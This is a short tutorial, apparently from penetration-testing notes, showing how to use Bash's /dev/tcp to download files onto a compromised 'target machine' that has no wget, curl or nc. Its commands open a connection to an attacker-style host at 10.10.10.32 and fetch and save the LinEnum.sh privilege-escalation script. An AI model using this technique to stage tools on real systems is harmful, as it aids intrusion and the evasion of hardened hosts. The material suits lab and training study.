If you’re stuck on a **minimal Linux system** with **no `wget`, `curl`, or `nc`**, you can still download files using Bash’s built-in networking feature:

`/dev/tcp` — available in most Bash versions **v2.04 and above**.

---

## **1. Open a TCP Connection (Target Machine)**

Use `exec` to open a connection to the attacker or web server:

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

- `3<>` → Opens a **bidirectional file descriptor** (for reading and writing).
    
- `10.10.10.32` → Replace with the **server IP**.
    
- `80` → Port number, usually HTTP.
    

---

## **2. Send an HTTP GET Request**

Send a simple GET request for the file you want:

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
```

- `-e` → Enables escape sequences for line breaks.
    
- `/LinEnum.sh` → Replace with the path to your desired file.
    

---

## **3. Read the Response**

Print the server’s response (headers + file content):

```bash
cat <&3
```

---

## **4. Save the File**

Instead of printing to the screen, save it directly:

```bash
cat <&3 > LinEnum.sh
```

Now you have the file saved locally as `LinEnum.sh`.

---

## **Tips**

- Works best with **plain HTTP** servers.
    
- HTTPS connections won’t work because `/dev/tcp` does not handle SSL/TLS.
    
- Make sure the port you’re connecting to is open and reachable.
